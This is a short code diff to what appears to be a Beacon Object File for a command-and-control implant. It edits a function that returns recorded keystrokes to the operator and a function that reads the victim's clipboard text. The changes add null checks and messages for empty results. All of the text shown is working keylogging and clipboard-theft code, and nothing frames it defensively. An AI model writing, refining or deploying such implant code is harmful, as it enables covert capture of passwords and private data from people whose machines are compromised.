@@ -246,19 +246,26 @@ VOID dump() {
                 BeaconPrintf( CALLBACK_OUTPUT, "%ls", Keystrokes->Keys.Buffer );
             }
         } while ( Keystrokes->Next && ( Keystrokes = Keystrokes->Next ) );
+    } else {
+        BeaconPrintf( CALLBACK_OUTPUT, "No keystrokes were recorded!" );
     }
 }
 
-void clipboard(){
+void clipboard() {
+    HANDLE text = { 0 };
+
     //
     // open the clipboard
     //
-    if ( USER32$OpenClipboard( NULL ) ){
+    if ( USER32$OpenClipboard( NULL ) ) {
         //
         // get what's in the clipboard
         //
-        HANDLE Text = USER32$GetClipboardData( CF_TEXT );
-        BeaconPrintf( CALLBACK_OUTPUT, "%s", Text );
+        if ( ( text = USER32$GetClipboardData( CF_TEXT ) ) ) {
+            BeaconPrintf( CALLBACK_OUTPUT, "%s", text );
+        } else {
+            BeaconPrintf( CALLBACK_ERROR, "The clipboard is empty" );
+        }
     } else {
         BeaconPrintf( CALLBACK_ERROR, "GetClipboardData failed with error: %d", NtLastError() );
     }
